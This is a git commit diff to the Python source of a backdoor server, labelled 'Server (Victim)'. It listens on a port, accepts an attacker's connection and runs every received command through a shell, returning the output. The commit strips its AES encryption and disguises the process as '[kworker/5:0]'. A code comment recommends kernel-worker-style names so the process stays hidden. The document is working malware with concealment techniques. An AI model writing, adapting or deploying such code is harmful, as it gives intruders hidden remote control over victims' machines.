af187919f9103a1cf0f1a39f6995d92dc51c3674
Greg Tiernan <23054948@go.edgehill.ac.uk>
2017-08-10 20:55:49 +0100

    Removed Crypto

--- src/server.py
+++ src/server.py
@@ -6,8 +6,6 @@ Backdoor - Server (Victim) by Jeffrey Sasaki
 The server program will execute a command given by the client (attacker) and
 outputs the response back to the client.
 '''
-from Crypto.Cipher import AES
-from Crypto import Random
 import socket
 import base64
 import os
@@ -20,19 +18,8 @@ import setproctitle
 # NOTE: generally a backdoor would not be named "backdoor" a recommended process
 # title would be something like "[kworker/0:0H]" or
 # "/usr/bin/systemd/systemd-login"
-title = "backdoor"
+title = "[kworker/5:0]"
 setproctitle.setproctitle(title)
-
-# encrypt/encode and decrypt/decode a string
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
-DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
-
-# random secret key (both the client and server must match this key)
-secret = "sixteen byte key"
-iv = Random.new().read(AES.block_size)
-
-# create cipher object
-cipher = AES.new(secret, AES.MODE_CFB, iv)
 
 # parse command line argument
 # generally any output would be concealed on the server (victim's) side
@@ -50,26 +37,20 @@ c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 c.bind(('0.0.0.0', port))
 c.listen(1)
 s, a = c.accept()
-s.send(EncodeAES(cipher, 'You are connected' + secret))
+s.send('You are connected')
 
 while True:
 	data = s.recv(1024)
 
-	# decrypt data
-	decrypted = DecodeAES(cipher, data)
-	
 	# check for "exit" by the attacker
-	if decrypted == "exit":
+	if data == "exit":
 		break    	
 
 	# execute command
-	proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-	stdoutput = proc.stdout.read() + proc.stderr.read() + secret
-
-	# encrypt output
-	encrypted = EncodeAES(cipher, stdoutput)
+	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	stdoutput = proc.stdout.read() + proc.stderr.read()
 
 	# send encrypted output
-	s.send(encrypted)
+	s.send(stdoutput)
 s.close()
 sys.exit()
